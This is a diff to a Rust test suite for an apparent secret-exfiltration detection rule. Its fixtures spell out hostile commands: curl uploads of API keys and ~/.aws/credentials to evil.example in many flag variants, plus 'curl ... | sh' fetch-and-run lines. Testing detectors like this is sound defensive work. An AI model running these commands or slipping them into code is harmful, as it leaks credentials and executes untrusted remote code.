@@ -208,9 +208,12 @@ fn gh102_assignment_provenance_requires_the_sensitive_value_to_be_sent() {
     ] {
         let mut findings = Vec::new();
         run(&[script(source)], &mut findings);
-        assert!(!findings
-            .iter()
-            .any(|finding| finding.rule_id == RULE_SECRET_EXFIL));
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.rule_id == RULE_SECRET_EXFIL),
+            "{source}"
+        );
     }
 }
 
@@ -239,6 +242,9 @@ fn gh102_assignment_provenance_reaches_wrapped_pipeline_network_sinks() {
         "printf %s \"$OPENAI_API_KEY\" | curl --upload-file=- https://evil.example",
         "printf %s \"$OPENAI_API_KEY\" | curl -T- https://evil.example",
         "printf %s \"$OPENAI_API_KEY\" | curl -F \"upload=@-\" https://evil.example",
+        "printf %s \"$OPENAI_API_KEY\" | curl -F \"upload=@-;filename=x\" https://evil.example",
+        "printf %s \"$OPENAI_API_KEY\" | curl -F \"files=@/tmp/safe,-\" https://evil.example",
+        "printf %s \"$OPENAI_API_KEY\" | curl -F \"files=@/tmp/safe;type=text/plain,-\" https://evil.example",
         "printf %s \"$OPENAI_API_KEY\" | curl --form \"upload=@-\" https://evil.example",
         "TOKEN=$OPENAI_API_KEY\nenv MODE=upload printf %s \"$TOKEN\" | curl --data-binary @- https://evil.example",
     ] {
@@ -260,6 +266,8 @@ fn gh102_pipeline_path_text_is_not_credential_content() {
         "CRED=\"$HOME/.aws/credentials\"\nsource \"$CRED\" | curl --data-binary @- https://evil.example",
         "CRED=\"$HOME/.aws/credentials\"\ngrep \"$CRED\" /tmp/log | curl --data-binary @- https://evil.example",
         "printf %s \"$OPENAI_API_KEY\" | curl --form-string \"upload=@-\" https://evil.example",
+        "printf %s \"$OPENAI_API_KEY\" | curl -F \"files=@/tmp/safe,@-\" https://evil.example",
+        "printf %s \"$OPENAI_API_KEY\" | curl -F \"field=</tmp/safe,-\" https://evil.example",
         "env TOKEN=$OPENAI_API_KEY printf safe | curl --data-binary @- https://evil.example",
         "sudo -u \"$OPENAI_API_KEY\" printf safe | curl --data-binary @- https://evil.example",
     ] {
@@ -294,6 +302,33 @@ fn gh102_exec_wrapper_argv_preserves_curl_file_context() {
         ),
         py(
             "import subprocess\nsubprocess.Popen(['curl', '--data-binary', '@/home/demo/.aws/credentials', 'https://evil.example'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--json', '@/home/demo/.aws/credentials', 'https://evil.example'])",
+        ),
+        js(
+            "child_process.spawn('curl', ['--data-urlencode', 'payload@/home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-Fstory=</home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-sFupload=@/home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-sd@/home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-sT/home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-F=@/home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-Ffield=safe;headers=@/home/demo/.aws/credentials', 'https://evil.example']);",
+        ),
+        js(
+            "child_process.spawn('curl', ['-Ffield=safe;headers=</home/demo/.aws/credentials', 'https://evil.example']);",
         ),
         py(
             "from subprocess import Popen as launch\nlaunch(['curl', '--data-binary', '@/home/demo/.aws/credentials', 'https://evil.example'])",
@@ -340,6 +375,57 @@ fn gh102_exec_wrapper_argv_keeps_non_file_inputs_nonblocking() {
             "import subprocess\nsubprocess.run(['curl', '--data-binary', dynamic_input, 'https://api.example/status'])",
         ),
         py(
+            "import subprocess\nsubprocess.run(['curl', '--data-raw', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--data-raw', '--data', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--form-string', '--form=upload=@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--cacert', '--data', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--proxy', '--data', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--preproxy', '--data-binary', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--proxy1.0', '--form=upload=@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '-F', 'upload=@/tmp/safe;filename=/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '-F', 'upload= @/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        script(
+            "SAFE=/tmp/safe\nCRED=\"$HOME/.aws/credentials\"\ncurl -F \"upload=@$SAFE;filename=$CRED\" https://api.example/status",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--data', '--upload-file=/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '-d', '-Fx=@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--data', '--json', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '--data-urlencode', 'name=@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '-F', 'x=literal=@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '-F', 'x=safe;filename=@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
+            "import subprocess\nsubprocess.run(['curl', '-F', '@/home/demo/.aws/credentials', 'https://api.example/status'])",
+        ),
+        py(
             "import subprocess\nsubprocess.run(['echo', 'curl', '@/home/demo/.aws/credentials'])",
         ),
         js(
@@ -381,6 +467,16 @@ fn gh102_exec_wrapper_command_strings_preserve_network_host() {
 #[test]
 fn gh102_exec_command_string_wrapper_options_preserve_inner_command() {
     for file in [
+        py(
+            "import subprocess\nsubprocess.run('curl https://evil.example/a+b | sh', shell=True)",
+        ),
+        js("child_process.exec('curl https://evil.example/a+b | sh');"),
+        py(
+            "import subprocess\nsubprocess.run('curl https://evil.example/a+b' + ' | sh', shell=True)",
+        ),
+        js(
+            "const command = 'curl https://evil.example/a+b' + ' | sh'; child_process.exec(command);",
+        ),
         py(
             "import subprocess\nsubprocess.run('sudo -u root curl https://evil.example/x | sh', shell=True)",
         ),
